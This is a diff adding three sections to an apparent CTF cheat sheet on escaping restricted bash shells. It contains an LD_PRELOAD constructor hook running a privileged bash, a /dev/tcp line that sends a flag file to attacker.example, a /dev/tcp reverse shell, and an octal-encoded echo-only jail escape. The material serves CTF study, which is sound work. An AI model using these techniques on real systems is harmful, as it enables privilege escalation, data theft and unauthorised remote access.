@@ -13,6 +13,9 @@
 - [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
 - [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
 - [Bash Jail Bypass via $'...' Octal Encoding (34C3 CTF 2017)](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
+- [LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)](#ld_preload-hook-via-rbash-allowed-variable-set-otw-advent-2018)
+- [/dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)](#devtcp-exfiltration-from-minimal-command-set-otw-advent-2018)
+- [Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)](#layer-by-layer-echo-only-bash-escape-insomnihack-2019)
 - [References](#references)
 
 ---
@@ -218,6 +221,71 @@ Also: extract characters from existing environment variables:
 ```
 
 **Key insight:** Bash's `$'...'` syntax interprets `\NNN` as octal byte values, allowing arbitrary string construction without using any alphabetic characters. Combined with environment variable substring extraction (`${VAR:offset:length}`), this bypasses nearly any character blacklist. The `__` variable name uses only underscores (often not blocked). When letters are banned but `$`, `'`, `\`, and digits are allowed, octal encoding in ANSI-C quotes is the primary escape vector.
+
+---
+
+## LD_PRELOAD Hook via rbash-Allowed Variable Set (OTW Advent 2018)
+
+**Pattern:** rbash blocks path arguments but still allows `VAR=value command` prefixes on invocations of permitted binaries. Upload a shared object encoding a libc hook, then export `LD_PRELOAD=./hook.so` before any command in the allowlist (`cat`, `ls`, `id`). The hook runs on every libc symbol call from the allowed binary.
+
+```c
+// hook.c — hijacks open()
+#include <stdlib.h>
+__attribute__((constructor))
+void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
+```
+
+```bash
+gcc -shared -fPIC hook.c -o /tmp/hook.so
+LD_PRELOAD=/tmp/hook.so cat   # constructor runs before cat
+```
+
+**Key insight:** Restricted shells enforce argv filtering, not environment filtering. Any allowed binary dynamically linked to libc can be hijacked through `LD_PRELOAD` as long as you can write a `.so` to a writable path. Harden by unsetting `LD_PRELOAD`, `LD_LIBRARY_PATH`, and `LD_AUDIT` on shell entry.
+
+**References:** OverTheWire Advent 2018 — Claustrophobic, writeup 12770
+
+---
+
+## /dev/tcp Exfiltration from Minimal Command Set (OTW Advent 2018)
+
+**Pattern:** Only `cat`, `echo`, and `dd` are available — no `curl`, `wget`, `nc`, `python`. Bash exposes `/dev/tcp/<host>/<port>` as a virtual socket file; redirecting to it opens a raw TCP connection without any extra binary.
+
+```bash
+cat /opt/flag > /dev/tcp/attacker.example/8081
+# attacker side:
+nc -lvnp 8081
+```
+
+Bidirectional shells:
+
+```bash
+exec 3<> /dev/tcp/attacker.example/8081
+cat <&3 | bash >&3 2>&3
+```
+
+**Key insight:** `/dev/tcp` and `/dev/udp` are *built into bash*, not real filesystem paths — any distribution shipping GNU bash supports them even when `netcat`/`curl` are missing. Always test file redirection before assuming you need an external tool.
+
+**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12780
+
+---
+
+## Layer-by-Layer Echo-Only Bash Escape (Insomnihack 2019)
+
+**Pattern:** Jail allows only `echo`, `(`, `)`, `+`, `=`, `;`, `\`, `$`, and whitespace. Escape by recursively constructing stronger primitives each round:
+
+```bash
+# Round 0: allowed chars → unlimited `=` via $((a = 1))
+# Round 1: arithmetic sets more vars; use $'\NNN' via increment loops
+a=$((++a))                       # counters without digits
+# Round N: emit arbitrary payload as octal escapes
+$('\143\141\164'  /flag)         # cat /flag
+```
+
+Build numbers using `++` on uninitialised variables, then index characters out of `$PATH`, `$PWD`, or any leaked variable. Finally concatenate those characters with `\` to form any command.
+
+**Key insight:** Echo-only jails are escapable because bash's arithmetic context treats uninitialised variables as `0` and supports `++`, giving you any integer without digits. From there, `$'\NNN'` builds any byte, which builds any command.
+
+**References:** Insomnihack teaser 2019 — echoechoechoecho, writeup 12911
 
 ---
 
